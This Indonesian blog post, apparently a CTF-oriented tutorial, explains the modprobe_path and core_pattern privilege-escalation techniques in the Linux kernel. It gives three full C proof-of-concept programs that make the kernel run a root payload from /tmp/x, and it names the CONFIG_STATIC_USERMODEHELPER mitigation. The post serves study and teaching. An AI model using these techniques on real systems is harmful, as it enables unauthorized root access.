---
layout: post
author: zafirr
title:  "modprobe_path and core_pattern"
description: Indo-focused vulnerability research post 2
date: 2026-04-10
last_modified_at: 2026-04-17
categories: research
lang: id
tags:
    - ctf
    - vulnerability research
    - series
---

<br>
Tingkat kesulitan: **Mudah**

### _Privilege Escalation_

Tujuan eksploitasi linux kernel bukan untuk "pop shell". Berbeda dengan [_userspace_](https://en.wikipedia.org/wiki/User_space_and_kernel_space#Overview), tujuan eksploitasi di linux kernel adalah mencapai _privilege escalation_, atau dalam kata lain, meningkatkan akses terhadap sistem yang sedang kita eksploitasi. 

Terdapat berbagai cara untuk mencapai _privilege escalation_ di linux. Terkadang, terdapat kelemahan pada aplikasi _userspace_ yang sudah memiliki akses lebih (contoh: [sudo](https://nvd.nist.gov/vuln/detail/CVE-2025-32463), [sshd](https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server), atau bahkan [telnetd](https://nvd.nist.gov/vuln/detail/CVE-2026-32746)). Akan tetapi, pada blog kali ini saya ingin menjelaskan kasus saat terdapat kelemahan _arbitrary write_ pada memori linux kernel, dan dua metode yang lumayan simpel yang dapat digunakan untuk mencapai _privilege escalation_.

### modprobe_path
Di linux, terdapat sebuah program bernama [modprobe](https://www.man7.org/linux/man-pages/man8/modprobe.8.html) yang disimpan di `/sbin/modprobe`. Tujuannya adalah untuk instalasi sebuah [kernel module](https://en.wikipedia.org/wiki/Loadable_kernel_module) (Bayangkan seperti penambahan fungsionalitas terhadap kernel yang sedang dijalankan). Ternyata, linux kernel sendiri bakal menjalankan modprobe ketika menjalankan program dengan [magic number](https://en.wikipedia.org/wiki/File_format#Magic_number) yang tidak dikenal. Misal, 4 byte pertama sebuah file adalah \xff\xff\xff\xff, dan file tersebut dijalankan (dengan syscall execve), maka linux akan mengikuti alur berikut:

```c
sys_execve()
  => do_execve()
    => do_execveat_common()
      => bprm_execve()
        => exec_binprm()
          => search_binary_handler()
            => request_module()
              => __request_module()
                => call_modprobe()
                  => call_usermodehelper_exec()
                    => queue_work(call_usermodehelper_exec_work)
[ kworker ]
call_usermodehelper_exec_work()
  => call_usermodehelper_exec_sync()
    => call_usermodehelper_exec_async()
      => kernel_execve()
```
(Sumber: [Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch))

Sepertinya, linux melakukan ini sebab sistem [binfmt_misc](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html), yaitu sistem untuk menjalankan program yang tidak dikenal (bukan ELF, bash script, dll). Ketika sebuah program asing dijalankan, linux mengambil asumsi bahwa _mungkin_ terdapat sebuah kernel module yang dapat menjalankan program tersebut, dan oleh karena itu modprobe dijalankan.

Untuk menjalankan modprobe, linux mesti tau modprobe diletakkan dimana. Saya sebutkan sebelumnya bahwa modprobe disimpan di `/sbin/modprobe`, tetapi linux memberikan pilihan kepada pengguna untuk memindahkannya ke lokasi lain. Lokasi tersebut disimpan pada variable bernama `modprobe_path`, dan dapat diatur oleh developer ketika melakukan kompilasi linux kernel dengan [mengatur CONFIG_MODPROBE_PATH](https://elixir.bootlin.com/linux/v6.19.11/source/kernel/module/kmod.c#L64).

Untuk alasan yang saya lupa, `modprobe_path` merupakan variable yang _writable_. Oleh karena itu, jika terdapat sebuah kelemahan pada linux dimana sebuah user dapat mengubah nilai `modprobe_path`, maka user tersebut bisa mengubahnya untuk menunjuk ke lokasi lain (misal `/tmp/x`), dan sebab alur yang saya sebutkan sebelumnya, user tersebut dapat meminta linux kernel untuk menjalankan program tersebut dengan akses yang lebih tinggi (root).

Berikut contoh sederhana. File untuk menjalankan contoh ini dapat diunduh [di sini](https://drive.google.com/drive/folders/1RlTVnCE3zoc2KMBu8T4zg0VzZVg9sZHJ?usp=sharing)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

void fatal(const char *s) {
  perror(s);
  exit(1);
}

int check_modprobe_path() {
    // Check if /proc/sys/kernel/modprobe_path has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/modprobe", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "/tmp/x", 0x6) == 0;
}

int main() {

    // Pretend this is a kernel vuln to overwrite modprobe_path to /tmp/x
    syscall(470, 0);

    if(!check_modprobe_path()) fatal("modprobe_path not ovewritten");

    // The command we want root to run
    char *payload = "#!/bin/sh\nchmod -R 777 /flag\n";
    int fd;
    fd = open("/tmp/x", O_RDWR | O_CREAT);
    if (fd < 0) fatal("cannot create file /tmp/x");
    write(fd, payload, strlen(payload));
    close(fd);

    // The file that will trigger the kernel to call the binary at modprobe_path
    fd = open("/tmp/y", O_RDWR | O_CREAT);
    if (fd < 0) fatal("cannot create file /tmp/y");
    write(fd, "\xff\xff\xff\xff", 4); // Invalid file header
    close(fd);

    system("chmod 777 /tmp/x /tmp/y");
    system("/tmp/y"); // Will trigger the kernel to call the file at modprobe_path

    return 0;
}
```

### Kok gabisa?
Kalo dicoba contoh yang diatas pada linux versi 6.14+, tidak bakal berhasil. Disebutkan pada [blog Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch), terdapat sebuah [patch](https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04) yang menghapus pemanggilan modprobe yang sudah saya sebutkan sebelumnya.

Blog Theori tersebut juga memberikan solusi. Di linux kernel, terdapat [_crypto_ API](https://www.kernel.org/doc/html/v4.11/crypto/userspace-if.html) yang dapatkan digunakan oleh user apapun. API ini dapat diakses dengan membuat socket dengan tipe AF_ALG. Ternyata, alur yang hampir sama dengan alur `binfmt_misc` yang sudah disebutkan diatas.

Ketika socket AF_ALG dibuat dengan `salg_type` (tipe algoritma kripto) yang asing, linux mengambil asumsi bahwa _mungkin_ terdapat sebuah kernel module yang mengerti tipe algoritma tersebut. Oleh karena itu, `modprobe` akan dipanggil, dan tentunya lokasinya akan diambil dari `modprobe_path`.

Berikut contoh sederhana. File untuk menjalankan contoh ini dapat diunduh [di sini](https://drive.google.com/drive/folders/1RlTVnCE3zoc2KMBu8T4zg0VzZVg9sZHJ?usp=sharing)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_alg.h>

void fatal(const char *s) {
  perror(s);
  exit(1);
}

int check_modprobe_path() {
    // Check if /proc/sys/kernel/modprobe_path has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/modprobe", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "/tmp/x", 0x6) == 0;
}

int main() {

    // Pretend this is a kernel vuln to overwrite modprobe_path to /tmp/x
    syscall(470, 0);

    if(!check_modprobe_path()) fatal("modprobe_path not ovewritten");

    // The command we want root to run
    char *payload = "#!/bin/sh\nchmod -R 777 /flag\n";
    int fd;
    fd = open("/tmp/x", O_RDWR | O_CREAT);
    if (fd < 0) fatal("cannot create file /tmp/x");
    write(fd, payload, strlen(payload));
    close(fd);

    system("chmod 777 /tmp/x");

    // New trigger using af_alg
    struct sockaddr_alg sa;
    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) fatal("socket(AF_ALG) failed");

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "zafirr");  // dummy string
    bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));

    return 0;
}
```


Terdapat teknik kedua yang lumayan mirip dengan teknik `modprobe_path`.

### core_pattern
Terdapat sistem [coredump](https://man7.org/linux/man-pages/man5/core.5.html) pada linux. Ketika sebuah aplikasi di _userspace_ mengirim [signal](https://www.man7.org/linux/man-pages/man7/signal.7.html) tertentu, linux akan menghasilkan sebuah file _coredump_, yang berisi keadaan _process_ tersebut saat _signal_ tersebut diterima. Nama dari file tersebut diatur di variable yang bernama [core_pattern](https://docs.kernel.org/admin-guide/sysctl/kernel.html#core-pattern).

Ternyata, terdapat alur khusus saat linux menghasilkan _coredump_. Biasanya, nilai yang terdapat pada `core_pattern` merupakan nama file, akan tetapi jika karakter pertama pada `core_pattern` adalah karakter pipe `|`, maka nilai dari `core_pattern` (selain karakter pipe tadi) akan diperlakukan seperti [_command_ yang mesti dijalankan](https://elixir.bootlin.com/linux/v7.0/source/fs/coredump.c#L1104). Seperti pada kasus `modprobe_path`, _command_ ini bakal dijalankan dengan akses yang lebih tinggi (root).

Sama dengan `modprobe_path`, `core_pattern` merupakan variable yang _writeable_. Oleh karena itu, jika terdapat sebuah kelemahan pada linux dimana sebuah user dapat mengubah nilai `core_pattern`, maka _privilege escalation_ berhasil dicapai.

Daftar _signal_ yang dapat digunakan untuk menghasilkan _coredump_ dapat dilihat [di sini](https://man7.org/linux/man-pages/man7/signal.7.html). SIGSEGV (Segmentation Fault) merupakan _signal_ yang lumayan mudah untuk dipicu, maka saya akan gunakan _signal_ tersebut.

Berikut contoh sederhana. File untuk menjalankan contoh ini dapat diunduh [di sini](https://drive.google.com/drive/folders/1RlTVnCE3zoc2KMBu8T4zg0VzZVg9sZHJ?usp=sharing)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

void fatal(const char *s) {
  perror(s);
  exit(1);
}


int check_core_pattern() {
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/tmp/x", 0x7) == 0; // The pipe `|` is important!
}

int main() {

    // Pretend this is a kernel vuln to overwrite core_pattern to /tmp/x
    syscall(470, 1);

    if(!check_core_pattern()) fatal("core_pattern not ovewritten");

    // The command we want root to run
    char *payload = "#!/bin/sh\nchmod -R 777 /flag\n";
    int fd;
    fd = open("/tmp/x", O_RDWR | O_CREAT);
    if (fd < 0) fatal("cannot create file /tmp/x");
    write(fd, payload, strlen(payload));
    close(fd);

    system("chmod 777 /tmp/x");

    // Trigger kernel to run file at core_pattern with segfault!
    *(size_t *)0 = 0;

    return 0;
}
```

### Proteksi
Terdapat sebuah konfigurasi pada linux yang dapat mencegah kedua teknik ini. [CONFIG_STATIC_USERMODEHELPER](https://www.kernelconfig.io/config_static_usermodehelper) merupakan konfigurasi pada linux untuk mengabaikan nilai pada modprobe_path atau core_pattern, dan menggunakan nilai statik yang dikonfigurasi saat kompilasi linux, dan bersifat [read-only](https://elixir.bootlin.com/linux/v7.0/source/kernel/umh.c#L369). Saat ini, konfigurasi ini **tidak** digunakan pada sebagian besar distribusi linux yang populer (Ubuntu, Red Hat, dsb).

### Latihan 
Kedua trik tersebut menjalankan sebuah program dengan akses root. Akan tetapi, jika seorang user sedang berada dalam namespace, bagaimana caranya biar user tersebut bisa keluar dari namespace (misal: keluar dari docker)?

Terdapat berbagai teknik pada [kernelctf](https://github.com/google/security-research/tree/master/kernelctf), silakan eksplorasi sendiri dan implementasi tekniknya.

### Penutup
Semoga episode berikutnya bakal selesai dalam waktu yang lebih cepat

### Referensi
* [https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)
* [https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
* [KernelCTF](https://github.com/google/security-research/tree/master/kernelctf)
* Rekan kerja 